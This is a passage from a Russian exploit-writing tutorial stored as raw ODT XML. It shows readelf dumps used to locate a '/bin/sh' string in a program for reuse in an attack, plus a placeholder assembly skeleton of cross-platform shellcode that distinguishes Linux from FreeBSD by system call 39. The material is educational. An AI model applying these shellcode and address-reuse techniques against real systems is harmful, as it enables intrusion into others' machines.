text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00073c </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000004 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">WA </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">4 <text:line-break/>[18] .got </text:span><text:span text:style-name="T12"><text:s text:c="10"/></text:span><text:span text:style-name="T11">PROGBITS </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">08049740 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000740 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00001c </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">04 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">WA </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">4 <text:line-break/>[19] .bss </text:span><text:span text:style-name="T12"><text:s text:c="10"/></text:span><text:span text:style-name="T11">NOBITS </text:span><text:span text:style-name="T12"><text:s text:c="3"/></text:span><text:span text:style-name="T11">0804975c </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00075c </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000020 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">WA </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">4 <text:line-break/>[20] .comment </text:span><text:span text:style-name="T12"><text:s text:c="6"/></text:span><text:span text:style-name="T11">PROGBITS </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00000000 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00075c </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000107 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s text:c="5"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">1 <text:line-break/>[21] .shstrtab </text:span><text:span text:style-name="T12"><text:s text:c="5"/></text:span><text:span text:style-name="T11">STRTAB </text:span><text:span text:style-name="T12"><text:s text:c="3"/></text:span><text:span text:style-name="T11">00000000 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000863 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">000099 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">00 </text:span><text:span text:style-name="T12"><text:s text:c="5"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="2"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">1 <text:line-break/>Key to flags: <text:line-break/>W (write), A (alloc), X (execute), M (merge), S (strings) <text:line-break/>I (info), L (link order), G (group), x (unknown) <text:line-break/>(extra OS processing required) о (OS specific), p (processor specific) </text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:p text:style-name="P1">В листинге выше перечислены все сегменты программы <text:span text:style-name="T9">reusage</text:span>. Сегмент .data (с номером 12) начинается с адреса 08049684 и занимает 0x0с байтов. Чтобы увидеть содержимое этой области памяти, можно воспользоваться командой х отладчика gdb или этой же утилитой <text:span text:style-name="T9">readelf</text:span>, которая умеет показывать содержимое сегмента в шестнадцатеричном виде и в кодировке ASCII. </text:p>
      <text:p text:style-name="P1">Посмотрим, что находится в сегменте .data. Номер сегмента .data равен 12. Если запустить <text:span text:style-name="T9">readelf</text:span> c флагом -<text:span text:style-name="T9">х</text:span> и указать этот номер, то она покажет содержимое сегмента:</text:p>
      <text:p text:style-name="P5">bash-2.05b$ readelf -x 12 reusage <text:line-break/>Hex dump of section '.data<text:span text:style-name="T1">'</text:span>: <text:line-break/>0x8049684 08049738 00000000 080485da <text:span text:style-name="T1"><text:s text:c="17"/></text:span>8... <text:line-break/>bash-2.05b$ </text:p>
      <text:p text:style-name="P1">В этом сегменте нет никаких данных, кроме адреса <text:span text:style-name="T1">(0</text:span>x080485da), который является не чем иным, как указателем на сегмент «.rodata». Посмотрим, нет ли в этом сегменте строки «/bin/sh».</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"><text:s/>l bash</text:span>-2.05b$ readelf -x 11 reusage <text:line-break/><text:span text:style-name="T1"> </text:span>2 Hex dump of section '.rodata': <text:line-break/><text:span text:style-name="T1"> </text:span>3 0x080485da 6c2f6372 73203a44 53426565 72462400 .$FreeBSD: src/l <text:line-break/><text:span text:style-name="T1"> </text:span>4 0x080485ea 2f666c65 2d363833 692f7573 632f6269 ib/csu/i386-olf/ <text:line-break/><text:span text:style-name="T1"> </text:span>5 0x080485fa 30303220 362e3120 762c532e 69747263 crti.S,v 1.6 <text:span text:style-name="T1">200</text:span> <text:line-break/><text:span text:style-name="T1"> </text:span>6 0x0804860a 39343a39 313a3430 2035312f 35302f32 2/05/15 04:19:4<text:span text:style-name="T1">9</text:span> <text:line-break/><text:span text:style-name="T1"> </text:span>7 0x0804861a 622f0024 20707845 206e6569 72626f29 obrien <text:span text:style-name="T1">E</text:span>xp $ ./b <text:line-break/><text:span text:style-name="T1"> </text:span>8 0x0804862a 42656572 4624000a 73250068 732f6e69 in/<text:span text:style-name="T1">s</text:span>h.%<text:span text:style-name="T1">s</text:span>..$<text:span text:style-name="T1">F</text:span>r<text:span text:style-name="T1">eeb</text:span> <text:line-break/><text:span text:style-name="T1"> </text:span>9 0x0804863a 2f757363 2f62696c 2f637273 203a4453 SD: <text:span text:style-name="T1">s</text:span>rc/<text:span text:style-name="T1">li</text:span>b/<text:span text:style-name="T1">cs</text:span>u/ <text:line-break/>10 0x0804864a 2c532e6e 7472632f 666c652d 36383369 <text:span text:style-name="T1">i386</text:span>-<text:span text:style-name="T1">e</text:span>l<text:span text:style-name="T1">f</text:span>/<text:span text:style-name="T1">crnt</text:span>.<text:span text:style-name="T1">S</text:span>, <text:line-break/><text:span text:style-name="T1">11 0x0804865a</text:span> 35312f35 302f3230 30322035 <text:span text:style-name="T1">2e312076 </text:span>v 1.<text:span text:style-name="T1">5 2002</text:span>/<text:span text:style-name="T1">05</text:span>/<text:span text:style-name="T1">15</text:span> <text:line-break/>12 0x0804867a 6e656972 <text:span text:style-name="T1">626f2039</text:span> <text:span text:style-name="T1">243a3931</text:span> <text:span text:style-name="T1">3a343020</text:span> <text:span text:style-name="T1"><text:s/></text:span>04:19:49 <text:span text:style-name="T1">obrien</text:span> <text:line-break/>13 0x0804867a <text:span text:style-name="T1"><text:s text:c="20"/></text:span>00<text:span text:style-name="T1">2420 70784520</text:span> <text:span text:style-name="T1"><text:s/>E</text:span>xp <text:span text:style-name="T1">$</text:span>. <text:line-break/>14 <text:span text:style-name="T1">bash</text:span>-<text:span text:style-name="T1">2</text:span>.<text:span text:style-name="T1">05b$</text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:p text:style-name="P1">Строка «/bin/sh» начинается в конце строки 7 и продолжается на строке 8. Точный адрес можно вычислить, прибавив к адресу, указанному в начале строки 7 <text:span text:style-name="T1">(0</text:span>x0804861а), число байтов до символа <text:span text:style-name="T1">'/'</text:span> то есть 14. В результате получится 0x08048628. Это тот же адрес, который мы нашли в результате дизассемблирования функции <text:span text:style-name="T9">abuse</text:span>(). </text:p>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">Shell-код, работающий в разных ОС </text:h>
      <text:p text:style-name="P1">Главное достоинство shell-кода, работающего в разных операционных системах, в том, что в ваш эксплойт достаточно вставить только один массив с shell-кодом, так что полезная нагрузка будет одной и той же, за исключением лишь длины и адресов возврата. Недостаток же состоит в том, что такой shell-код должен в процессе работы определить, в какой системе он выполняется. </text:p>
      <text:p text:style-name="P1">Выяснить, работает ли shell-код в ОС BSD или Linux относительно легко. Достаточно выполнить какой-нибудь системный вызов, который существует в обеих системах, но делает совершенно разные вещи, и посмотреть, что он вернет. Для различения Linux и FreeBSD может пригодиться вызов с номером 39. В Linux это <text:span text:style-name="T9">mkdir</text:span>, а в FreeBSD - <text:span text:style-name="T9">getppid</text:span>. </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Таким образом, в Linux системный вызов 39 создает каталог. Ему нужно передать несколько аргументов, в том числе указатель на массив символов, иначе будет возвращена ошибка. В FreeBSD этот системный вызов возвращает идентификатор родительского процесса и не требует аргументов. Выполнив показанный ниже код в Linux и FreeBSD, мы сможем различить эти платформы:</text:p>
      <text:p text:style-name="P50">хоr еах,еах <text:line-break/>xor ebx,ebx <text:line-break/>mov al,39 <text:line-break/>int 0x80</text:p>
      <text:p text:style-name="P1">Результат получится такой: </text:p>
      <text:p text:style-name="P5">Linux <text:s text:c="2"/>: ошибка (-1) <text:line-break/>FreeBSD : идентификатор процесса </text:p>
      <text:p text:style-name="P1">Поскольку идентификатор процесса никогда не бывает отрицательным, анализ возвращенного значения позволяет перейти на нужный участок программы.</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T18">Пример</text:span>. Ассемблерный код для различения Linux и FreeBSD </text:p>
      <text:p text:style-name="P5"><text:s/>1 xor eax,eax <text:line-break/> 2 xor ebx,ebx <text:line-break/> 3 mov al,39 <text:line-break/> 4 int 0x80 <text:line-break/> 5 <text:line-break/> 6 test eax,eax <text:line-break/> 7 js linux <text:line-break/> 8 <text:line-break/> 9 <text:line-break/>10 freebsd: <text:line-break/>11 <text:line-break/>12 ; Вставить реальный код <text:line-break/>13 <text:line-break/>14 <text:line-break/>15 linux: <text:line-break/>16 <text:line-break/>17 ; Вставить реальный код </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:list xml:id="list7693118770903504904" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P76">В строках 1-4 мы обращаемся к системному вызову 39, который в ОС FreeBSD не имеет аргументов. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P76">Задаем только первый аргумент системного вызова <text:span text:style-name="T9">mkdir</text:span>, следуя соглашению, принятому в Linux. Естественно, ядро возвращает ошибку. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P76">В строке 7 проверяем, завершился ли системный вызов успешно. Если нет, то мы переходим на код, соответствующий Linux, в противном случае продолжаем выполнять код, предназначенный для FreeBSD.</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1" svg:font-family="OpenSymbol" style:font-charset="x-symbol"/>
    <style:font-face style:name="Mangal1" svg:font-family="Mangal"/>
    <style:font-face style:name="OpenSymbol" svg:font-family="OpenSymbol"/>
    <style:font-face style:name="CourtierC" svg:font-family="CourtierC" style:font-family-generic="roman"/>
    <style:font-face style:name="CourtierCBold" svg:font-family="CourtierCBold" style:font-family-generic="roman"/>
    <style:font-face style:name="Times New Roman1" svg:font-family="'Times New Roman'" style:font-family-generic="roma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ru" fo:country="RU" style:letter-kerning="true" style:font-name-asian="Lucida Sans Unicode"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ru" fo:country="RU" style:letter-kerning="true" style:font-name-asian="Lucida Sans Unicode"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1cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:background-color="transparent" style:shadow="none">
        <style:tab-stops/>
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-size="10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Title" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Text_20_body" style:class="chapter">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Mangal" style:font-family-complex="Mangal" style:font-family-generic-complex="system" style:font-pitch-complex="variable"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2" style:display-name="Heading 2" style:family="paragraph" style:parent-style-name="Title" style:next-style-name="Text_20_body" style:default-outline-level="2" style:class="text">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.22cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="10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default-outline-level="3" style:class="text">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.22cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="Heading_20_4" style:display-name="Heading 4" style:family="paragraph" style:parent-style-name="Title"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1" style:display-name="Heading 1" style:family="paragraph" style:parent-style-name="Title" style:next-style-name="Text_20_body" style:default-outline-level="1" style:class="text" style:master-page-name="">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.22cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" style:page-number="auto"/>
      <style:text-properties fo:font-size="12pt"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9.7cm" fo:page-height="21.001cm" style:num-format="1" style:print-orientation="landscape"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columns fo:column-count="2" fo:column-gap="2cm">
          <style:column-sep style:width="0.026cm" style:color="#000000" style:height="100%" style:style="solid"/>
          <style:column style:rel-width="32767*" fo:start-indent="0cm" fo:end-indent="1cm"/>
          <style:column style:rel-width="32768*" fo:start-indent="1cm" fo:end-indent="0cm"/>
        </style:columns>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3-19T19:59:37.95</meta:creation-date>
    <dc:date>2014-03-13T19:36:40.533000000</dc:date>
    <meta:editing-duration>P12DT19H19M34S</meta:editing-duration>
    <meta:editing-cycles>26</meta:editing-cycles>
    <meta:generator>LibreOffice/4.1.3.2$Windows_x86 LibreOffice_project/70feb7d99726f064edab4605a8ab840c50ec57a</meta:generator>
    <meta:print-date>2014-03-13T09:57:10.339000000</meta:print-date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="17" meta:paragraph-count="910" meta:word-count="7540" meta:character-count="55894" meta:non-whitespace-character-count="46592"/>
    <meta:user-defined meta:name="Поле 1"/>
    <meta:user-defined meta:name="Поле 2"/>
    <meta:user-defined meta:name="Поле 3"/>
    <meta:user-defined meta:name="Поле 4"/>
  </office:meta>
</office:document-meta>
</file>